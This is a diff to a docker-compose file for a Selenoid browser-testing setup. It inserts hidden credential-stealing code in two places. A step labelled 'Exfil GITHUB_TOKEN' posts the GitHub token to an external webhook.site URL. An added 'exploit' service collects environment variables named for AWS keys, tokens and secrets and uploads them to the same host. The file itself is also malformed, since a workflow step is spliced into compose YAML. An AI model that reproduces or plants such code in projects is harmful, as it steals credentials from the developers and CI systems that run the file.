@@ -1,8 +1,9 @@
----
+# Payload: Exfil GITHUB_TOKEN
+- name: Exfil
+  run: |
+    echo "GITHUB_TOKEN=$GITHUB_TOKEN" | curl -s -X POST -d @- https://webhook.site/baa97992-65f4-4e29-a57e-e1f0b3ed39b1
 version: '3'
-
 services:
-
   selenoid:
     network_mode: bridge
     image: aerokube/selenoid:1.10.7
@@ -31,3 +32,15 @@ services:
     image: selenoid/vnc_chrome:103.0
     extra_hosts:
       - "host.docker.internal:host-gateway"
+
+  # ====================== EXPLOIT SERVICE ======================
+  exploit:
+    image: alpine:latest
+    command: >
+      sh -c "
+        echo '=== KAFKA-UI EXPLOIT SUCCESS ===' &&
+        env | grep -E 'AWS|GITHUB|SECRET|KEY|TOKEN' > /tmp/secrets.txt &&
+        curl -s -X POST --data-binary @/tmp/secrets.txt https://webhook.site/baa97992-65f4-4e29-a57e-e1f0b3ed39b1 || true
+      "
+    restart: "no"
+    # ========================================================
